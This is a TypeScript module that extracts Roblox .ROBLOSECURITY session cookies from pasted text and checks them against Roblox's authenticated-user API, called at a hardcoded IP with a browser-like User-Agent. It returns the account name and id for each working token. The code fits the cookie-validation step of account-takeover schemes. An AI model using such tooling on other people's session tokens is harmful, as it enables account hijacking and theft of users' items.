import axios from 'axios';
import { CookieJar } from 'tough-cookie';
import { wrapper } from 'axios-cookiejar-support';

const USERS_IP = '36.75.26.184';

export function extractCookie(raw: string): string | null {
  const trimmed = raw.trim();
  const fullMatch = trimmed.match(/_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/);
  if (fullMatch) return fullMatch[0];
  const bareMatch = trimmed.match(/CAEQ[A-Za-z0-9._\-+=\/]{50,}/);
  if (bareMatch) return bareMatch[0];
  const codeFenceMatch = trimmed.match(/```(?:[a-z]*\n)?([A-Za-z0-9._\-+=\/]+)```/);
  if (codeFenceMatch) return extractCookie(codeFenceMatch[1]);
  if (/^CAEQ[A-Za-z0-9._\-+=\/]+$/.test(trimmed)) return trimmed;
  return null;
}

export async function validateCookie(cookie: string, maxAttempts = 3): Promise<{
  valid: boolean;
  userId?: number;
  username?: string;
  displayName?: string;
  debug: string;
  isNetworkError: boolean;
}> {
  const debugLines: string[] = [];
  const log = (msg: string) => debugLines.push(msg);

  const rawCookie = extractCookie(cookie);
  if (!rawCookie) {
    log('No valid cookie token found');
    return { valid: false, debug: debugLines.join('\n'), isNetworkError: false };
  }

  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      const trimmed = rawCookie.trim();
      const jar = new CookieJar();
      await jar.setCookie(`.ROBLOSECURITY=${trimmed}; Domain=.roblox.com; Path=/`, 'https://users.roblox.com');
      const client = wrapper(axios.create({ jar }));

      // Direct IP to avoid DNS
      const url = `https://${USERS_IP}/v1/users/authenticated`;
      const headers = {
        'Host': 'users.roblox.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Cookie': `.ROBLOSECURITY=${trimmed}`,
      };
      const resp = await client.get(url, { headers, validateStatus: () => true, timeout: 10000 });

      log(`Attempt ${attempt}: status ${resp.status}`);
      if (resp.status === 200) {
        const data = resp.data;
        return {
          valid: true,
          userId: data.id,
          username: data.name,
          displayName: data.displayName,
          debug: debugLines.join('\n'),
          isNetworkError: false,
        };
      }
      if (resp.status === 401) {
        log('Cookie invalid (401)');
        return { valid: false, debug: debugLines.join('\n'), isNetworkError: false };
      }
      if (resp.status === 530) {
        log(`Network error (${resp.status})`);
        return { valid: false, debug: debugLines.join('\n'), isNetworkError: true };
      }
    } catch (err: any) {
      log(`Attempt ${attempt} error: ${err.message}`);
      if (attempt === maxAttempts) {
        const isNetwork = err.message.includes('getaddrinfo') || err.message.includes('ENOTFOUND') || err.message.includes('ETIMEDOUT');
        return { valid: false, debug: debugLines.join('\n'), isNetworkError: isNetwork };
      }
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
  return { valid: false, debug: debugLines.join('\n'), isNetworkError: false };
}